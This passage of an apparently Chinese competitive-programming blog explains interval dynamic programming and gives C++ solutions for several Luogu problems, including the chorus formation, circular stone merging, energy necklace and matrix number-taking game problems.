class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> c<span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">cal</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">cal</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">cal</span><span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">cal</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P3205-合唱队"><a href="#P3205-合唱队" class="headerlink" title="P3205 合唱队"></a><a href="https://www.luogu.com.cn/problem/P3205">P3205 合唱队</a></h4><ul><li>题意：<br>求初始队形的数量。</li></ul><ul><li><p>题解:<br>考虑使用区间DP。<br>$dp[i][j][0]$表示区间$[i,j]$且第i个元素从左边进入的方案数。$dp[i][j][1]$表示区间$[i,j]$且第j个元素从右边进入的方案数。<br>则存在动态转移方程：</p><script type="math/tex; mode=display">dp[i][j][0] +=\left\{\begin{aligned}  &dp[i+1][j][0],num[i]<num[i+1]\\  &dp[i+1][j][1],num[i]<num[j]\     \end{aligned}  \right.</script><script type="math/tex; mode=display">dp[i][j][1] +=\left\{\begin{aligned}  &dp[i][j-1][1],\quad num[j]>num[i]\\  &dp[i][j-1][0],\quad num[j]>num[i] \\  \end{aligned}  \right.</script></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">1005</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1005</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">num</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> num<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> num<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> num<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">%=</span> mod<span class="token punctuation">;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">%=</span> mod<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> mod <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1880-石子合并"><a href="#P1880-石子合并" class="headerlink" title="P1880  石子合并"></a><a href="https://www.luogu.com.cn/problem/P1880">P1880  石子合并</a></h4><ul><li>题意：<br>求合并的最大值和最小值</li></ul><ul><li>题解:<br>很经典的问题，考虑使用区间DP，注意是环形石子；<br>$dp[i][j][0]$表示区间$[i,j]$合并的最小的得分。$dp[i][j][1]$表示区间$[i,j]$合并的最大得分。<br>则存在动态转移方程：</li></ul><pre><code>$dp[i][j][0]=min(dp[i][k][0]+dp[k+1][j][0]+prefix[j]-prefix[i-1],dp[i][j][0])$$dp[i][j][1]=max(dp[i][k][1]+dp[k+1][j][1]+prefix[j]-prefix[i-1],dp[i][j][1])$</code></pre><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">105</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">105</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">[</span><span class="token number">105</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> prefix<span class="token punctuation">[</span><span class="token number">105</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        num<span class="token punctuation">[</span>i <span class="token operator">+</span> n<span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        prefix<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> prefix<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">,</span> tmp <span class="token operator">=</span> inf<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i<span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                tmp <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> prefix<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">-</span> prefix<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> prefix<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">-</span> prefix<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> maxx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> minn <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        maxx <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>maxx<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        minn <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>minn<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> minn <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> maxx <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1063-能量项链"><a href="#P1063-能量项链" class="headerlink" title="P1063  能量项链"></a><a href="https://www.luogu.com.cn/problem/P1063">P1063  能量项链</a></h4><ul><li><p>题意：<br>求合并的权值最大的值</p></li><li><p>题解：<br>一眼贪心，但是细想不行。有点像石子合并，考虑区间DP;但是这体面没给数据范围，数组只能往大了开。</p><p>  $dp[i][j]$表示区间i和j所能得到的最大值，那么只需要考虑枚举$[i,j]$之间的值即可，转移方程为:<br>  $dp[i][j]=max(dp[i][j],dp[i][k]+dp[k][j]+num[i]<em>num[k]</em>num[j])$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> num<span class="token punctuation">[</span>i <span class="token operator">+</span> n<span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> num<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">*</span> num<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1005-矩阵取数游戏"><a href="#P1005-矩阵取数游戏" class="headerlink" title="P1005  矩阵取数游戏"></a><a href="https://www.luogu.com.cn/problem/P1005">P1005  矩阵取数游戏</a></h4><ul><li><p>题意：<br>求按题意操作的最大取值。</p></li><li><p>题解：<br>考虑区间DP。状态转移方程：$dp[i][j]$表示区间取到区间$[i,j]$的最大取值个数。由于爆long long ，INT_128又不太会用，我选择使用python。</p><p>  $dp[i][j]=max(dp[i][j],dp[i-1][j]+num[i-1]<em>2^{m-j+i-1},dp[i][j+1]+num[j]</em>2^{m-j+i-1})$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> dp<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> num<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> l <span class="token 